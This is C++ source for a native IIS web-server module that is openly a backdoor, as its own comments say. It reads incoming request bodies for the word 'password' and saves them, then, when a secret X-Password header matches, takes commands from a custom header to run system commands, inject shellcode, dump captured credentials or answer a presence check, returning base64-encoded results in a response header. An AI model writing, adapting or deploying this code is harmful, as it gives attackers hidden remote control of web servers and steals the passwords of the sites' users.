#include "pch.h"
#include "HttpFactory.h"
#include <iostream>
#include <fstream>
#include <strsafe.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")



REQUEST_NOTIFICATION_STATUS CMyHttpModule::OnSendResponse(IN IHttpContext* pHttpContext, IN ISendResponseProvider* pProvider)
{
    IHttpRequest* pHttpRequest = pHttpContext->GetRequest();
    IHttpResponse* pHttpResponse = pHttpContext->GetResponse();


  

     // Extract Body
    LPVOID FormData = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    DWORD dwFormDataSize = 1024;
    HRESULT hrReadResult = pHttpRequest->ReadEntityBody(FormData, dwFormDataSize, FALSE, &dwFormDataSize, NULL);

    if (hrReadResult == S_OK) {
        // Check if it contains the password keyword.
        LPCSTR lpFound = strstr((LPCSTR)FormData, "password");
        if (lpFound != NULL) {
            WriteBody(FormData);
        }

    }

    VirtualFree(FormData, MAX_DATA, MEM_DECOMMIT);

    // Check the header password
    USHORT uPLen = 0;
    LPCSTR lpPassword = pHttpRequest->GetHeader("X-Password", &uPLen);

    if (lpPassword == NULL) {
        return RQ_NOTIFICATION_CONTINUE;
    }
    else if (strcmp(PASSWORD, lpPassword) != 0) {
        return RQ_NOTIFICATION_CONTINUE;
    }



    
    DWORD dwData = MAX_DATA;
    LPVOID Data = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID b64Data = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    USHORT usHeaderSize = 0;
    LPCSTR lpHeader = NULL;
  

    // PIN - Send PONG back to verify the backdoor is present.
    // CMD - Execute the command.
    // INJ - Inject shellcode.
    // DMP - Dump the extracted credentials.


    lpHeader = pHttpRequest->GetHeader(COM_HEADER, &usHeaderSize);
    if (lpHeader != NULL) {
        lpHeader = (LPCSTR)pHttpContext->AllocateRequestMemory(usHeaderSize + 1);
        lpHeader = pHttpRequest->GetHeader(COM_HEADER, &usHeaderSize);
        
        // Get the instruction
        LPCSTR lpInstruction = (LPCSTR)pHttpContext->AllocateRequestMemory(4 + 1);
        CopyMemory((LPVOID)lpInstruction, (LPVOID)lpHeader, 4);

        LPSTR lpCommand = static_cast<char*>((LPVOID)lpHeader) + 0x4;
        

        if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, lpInstruction, 4, "CMD|", 4) == 2) {
            RunCommand(Data, lpCommand);
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, lpInstruction, 4, "PIN|", 4) == 2) {
            CopyMemory(Data, "PONG", 4);
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, lpInstruction, 4, "INJ|", 4) == 2) {
            //Inject shellcode
            InjectShellcode(Data, lpCommand);
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, lpInstruction, 4, "DMP|", 4) == 2) {
            DumpCreds(Data);
            // Dump the credentials

        }
        else {
            CopyMemory(Data,"INVALID COMMAND",15);
        }


        DWORD dwB64Size = MAX_DATA;
   
        // Base64 Encode the String
        CryptBinaryToStringA((BYTE *)Data, strlen((LPCSTR)Data), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (LPSTR)b64Data, &dwB64Size);

        if (Data != NULL) {
            HRESULT s = pHttpResponse->SetHeader(COM_HEADER, (LPCSTR)b64Data, dwB64Size , false);
        
        }

    }
  


  
   

    // Free the Memory
    VirtualFree(Data, MAX_DATA, MEM_DECOMMIT);
    VirtualFree(b64Data, MAX_DATA, MEM_DECOMMIT);
    return RQ_NOTIFICATION_CONTINUE;
}


